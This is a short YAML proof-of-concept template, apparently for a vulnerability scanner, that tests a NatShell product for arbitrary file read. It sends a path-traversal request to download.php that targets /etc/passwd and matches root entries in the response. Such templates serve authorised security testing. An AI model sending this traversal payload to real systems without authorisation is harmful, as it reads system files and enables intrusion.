name: poc-yaml-natshell-arbitrary-file-read
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /download.php?file=../../../../../etc/passwd
            follow_redirects: false
        expression: response.status == 200 && "(root|toor):[x*]:0:0:".bmatches(response.body)
expression: r0()
